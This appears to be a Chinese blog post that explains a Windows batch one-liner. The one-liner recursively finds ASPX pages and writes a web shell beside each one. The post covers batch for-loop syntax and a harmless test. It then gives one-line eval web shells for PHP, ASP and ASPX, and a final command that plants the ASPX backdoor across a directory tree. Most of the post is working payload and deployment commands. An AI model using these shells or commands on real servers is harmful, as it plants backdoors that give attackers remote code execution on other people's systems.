今天在群里看到一个老哥的提问，五哥很快就帮这位兄弟解决了问题。感觉像windows下bat的命令，之前也基本没接触过，赶紧去学习一下吧。

  

这是老哥提的问题，说是执行有问题，不知道哪里错了。

*   

```
`for /r c: \  %i in (default*.aspx) do @echo ^<^%<@ page Language^=^"Jscript^"%^>^<^%eval^(Request.Item^[^"chopper^"^],^"unsafe^"^);^%^> > %~$PATH:idark5.aspx`
```

  
  
批处理命令  
%0 指批处理本身。%1 指批处理文件名后加的以空格分隔的字符串。%2~%9类推。eg：D盘根目录下有aa.txt，bb.txt，cc.txt三个文本和一个名1.bat的批处理，批处理内容是：@echo off start %1 start %3打开aa.txt（它是第一个参数即%1）和cc.txt（它是第三个参数即%3）  
for命令  

*   
*   
*   
*   
*   

```
`for %%variable IN (set) DO command [command-parameters]``%%variable指定一个单一字母表示可替换的参数。``(set)指定一个或一组文件。可以使用通配符。``command指定对每个文件执行的命令。``command-parameters为特定命令指定参数或命令行开关。`
```

参数 /d仅为目录  
参数 /R递归（文件名）  
参数 /L迭代数值范围  
参数 /F迭代及文件解析  
@在批处理中的意思是关闭当前行的回显。^ 将特殊符号 > 、<、 &转义，只把它们当成符号而不使用它们的特殊意义。  
%~$PATH : 1指的是查找列在 PATH 环境变量的目录，并将 %1扩充到找到的第一个完全合格的名称。如果环境变量名未被定义，或者没有找到文件，此组合键会扩充到空字符串。  
  
测试验证  
test123文件夹内有三个文件：1.txt、123.txt、2.txt递归查找test123目录下的所有1开头的txt文件，然后给了i，执行写入111的操作后，在i后面扩展dark5.aspx。结果是test123目录下多出两个文件：1.txtdark5.aspx、123.txtdark5.aspx。其内容都是111。  

*   

```
`for /r c:\Users\L\Desktop\test123\ %i in (1*.txt) do @echo 111 > %~$PATH:idark5.aspx`
```

  
写入一句话

*   
*   
*   

```
`php一句话： <?php @eval($_POST['dark5']);?>``asp一句话：   <%eval request ("dark5")%>``aspx一句话：  <%@ Page Language="Jscript"%> <%eval(Request.Item["dark5"],"unsafe");%>`
```

  
将111替换成一句话，并对特殊字符进行处理，修改扩展的后缀名。  

*   

```
`for /r c:\Users\L\Desktop\test123\ %i in (1*.txt) do @echo ^<%@ Page Language="Jscript"%^> ^<%eval(Request.Item["dark5"],"unsafe");%^> > %~$PATH:idark5.aspx`
```
